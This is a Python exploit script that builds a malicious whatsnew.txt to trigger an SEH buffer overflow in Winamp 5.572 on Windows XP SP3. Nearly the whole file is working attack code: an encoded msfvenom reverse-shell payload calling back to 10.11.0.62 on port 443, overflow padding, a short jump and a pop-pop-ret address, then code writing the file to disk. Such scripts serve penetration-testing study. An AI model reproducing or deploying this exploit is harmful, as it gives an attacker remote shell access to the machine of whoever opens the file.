#!/usr/bin/python
#
################################################################
# 
# Exploit Title: Winamp 5.572 whatsnew.txt SEH (No MSF)
#
# Modified to work on Windows XP SP3 - JMcPeters 2019
#
# This combines https://www.exploit-db.com/exploits/12255
# with https://www.exploit-db.com/exploits/11267
# Using the tested working adresses from the MSF module adding them to the code for the other.
# Payload is currently a reverse shell.
#
################################################################
#
#

print "|------------------------------------------------------------------|"
print "|                         __               __                      |"
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
print "|								  |"
print "|-------------------------------------------------[ EIP Hunters ]--|"


# msfvenom -p windows/shell_reverse_tcp -b '\x00\xff\x5c\x2f\x0a\x0d\x20' LHOST=10.11.0.62 LPORT=443 -f c EXITFUNC=process -e x86/alpha_mixed
# Payload size: 709 bytes
shellcode = (
"\x89\xe0\xdb\xc3\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49"
"\x6c\x4d\x38\x6e\x62\x37\x70\x33\x30\x43\x30\x53\x50\x6c\x49"
"\x7a\x45\x36\x51\x39\x50\x52\x44\x4c\x4b\x42\x70\x36\x50\x4c"
"\x4b\x43\x62\x64\x4c\x4c\x4b\x43\x62\x35\x44\x4c\x4b\x44\x32"
"\x67\x58\x44\x4f\x6d\x67\x33\x7a\x55\x76\x55\x61\x4b\x4f\x6c"
"\x6c\x35\x6c\x71\x71\x71\x6c\x73\x32\x76\x4c\x61\x30\x4f\x31"
"\x78\x4f\x46\x6d\x57\x71\x38\x47\x4a\x42\x5a\x52\x71\x42\x46"
"\x37\x4e\x6b\x71\x42\x76\x70\x4e\x6b\x70\x4a\x47\x4c\x4e\x6b"
"\x30\x4c\x37\x61\x42\x58\x6a\x43\x31\x58\x55\x51\x4a\x71\x43"
"\x61\x6c\x4b\x43\x69\x57\x50\x55\x51\x7a\x73\x6e\x6b\x72\x69"
"\x72\x38\x7a\x43\x64\x7a\x77\x39\x6c\x4b\x77\x44\x4c\x4b\x37"
"\x71\x78\x56\x44\x71\x59\x6f\x4c\x6c\x6a\x61\x48\x4f\x66\x6d"
"\x73\x31\x6a\x67\x45\x68\x69\x70\x30\x75\x4a\x56\x53\x33\x43"
"\x4d\x49\x68\x77\x4b\x43\x4d\x36\x44\x51\x65\x79\x74\x36\x38"
"\x4c\x4b\x46\x38\x51\x34\x55\x51\x6e\x33\x51\x76\x4c\x4b\x76"
"\x6c\x62\x6b\x4e\x6b\x46\x38\x35\x4c\x33\x31\x6b\x63\x4e\x6b"
"\x63\x34\x6c\x4b\x66\x61\x6e\x30\x6c\x49\x70\x44\x37\x54\x55"
"\x74\x61\x4b\x43\x6b\x61\x71\x56\x39\x31\x4a\x66\x31\x6b\x4f"
"\x4b\x50\x33\x6f\x63\x6f\x31\x4a\x4e\x6b\x72\x32\x6a\x4b\x4e"
"\x6d\x33\x6d\x50\x68\x66\x53\x77\x42\x43\x30\x55\x50\x71\x78"
"\x30\x77\x32\x53\x76\x52\x33\x6f\x52\x74\x72\x48\x42\x6c\x72"
"\x57\x55\x76\x57\x77\x79\x6f\x4a\x75\x68\x38\x4e\x70\x35\x51"
"\x47\x70\x33\x30\x76\x49\x5a\x64\x33\x64\x46\x30\x72\x48\x77"
"\x59\x4d\x50\x30\x6b\x37\x70\x59\x6f\x4b\x65\x42\x70\x52\x70"
"\x62\x70\x76\x30\x57\x30\x66\x30\x57\x30\x52\x70\x51\x78\x7a"
"\x4a\x54\x4f\x59\x4f\x59\x70\x39\x6f\x59\x45\x4a\x37\x53\x5a"
"\x45\x55\x65\x38\x34\x4a\x36\x6b\x45\x50\x45\x6e\x35\x38\x67"
"\x72\x33\x30\x46\x61\x4f\x4b\x4f\x79\x78\x66\x63\x5a\x42\x30"
"\x33\x66\x42\x77\x30\x68\x6e\x79\x6f\x55\x50\x74\x63\x51\x39"
"\x6f\x4a\x75\x6b\x35\x4f\x30\x70\x74\x64\x4c\x69\x6f\x50\x4e"
"\x47\x78\x51\x65\x48\x6c\x72\x48\x6a\x50\x38\x35\x6f\x52\x56"
"\x36\x4b\x4f\x58\x55\x73\x58\x55\x33\x62\x4d\x30\x64\x67\x70"
"\x6d\x59\x4a\x43\x46\x37\x42\x77\x36\x37\x74\x71\x48\x76\x30"
"\x6a\x75\x42\x61\x49\x52\x76\x4d\x32\x6b\x4d\x55\x36\x4b\x77"
"\x72\x64\x55\x74\x55\x6c\x76\x61\x55\x51\x4e\x6d\x77\x34\x44"
"\x64\x72\x30\x59\x56\x43\x30\x43\x74\x46\x34\x70\x50\x56\x36"
"\x53\x66\x31\x46\x63\x76\x46\x36\x42\x6e\x66\x36\x72\x76\x42"
"\x73\x56\x36\x61\x78\x50\x79\x4a\x6c\x37\x4f\x6b\x36\x4b\x4f"
"\x58\x55\x4f\x79\x4d\x30\x50\x4e\x70\x56\x77\x36\x59\x6f\x36"
"\x50\x72\x48\x56\x68\x6f\x77\x65\x4d\x61\x70\x4b\x4f\x59\x45"
"\x4d\x6b\x6c\x30\x6e\x55\x4d\x72\x52\x76\x35\x38\x79\x36\x6e"
"\x75\x6f\x4d\x4f\x6d\x49\x6f\x7a\x75\x75\x6c\x35\x56\x51\x6c"
"\x47\x7a\x6f\x70\x39\x6b\x69\x70\x50\x75\x57\x75\x4f\x4b\x77"
"\x37\x74\x53\x74\x32\x30\x6f\x42\x4a\x37\x70\x72\x73\x39\x6f"
"\x59\x45\x41\x41")

buff = "Winamp 5.572"
buff += "\x41" * 672
buff += "\xeb\x06\x90\x90"
buff += "\x97\x54\x02\x10" #0x10025497 pop ebx; pop ebp; retn gen_jumpex.dll
buff += "\x90" * 20
buff += shellcode
buff += "\xcc" * (4488-len(buff))


try:
   zip = open("whatsnew.txt",'w')
   zip.write(buff)
   zip.close()
   print "[+] Vulnerable file created!\n"
except:
   print "[-] Error occured!"
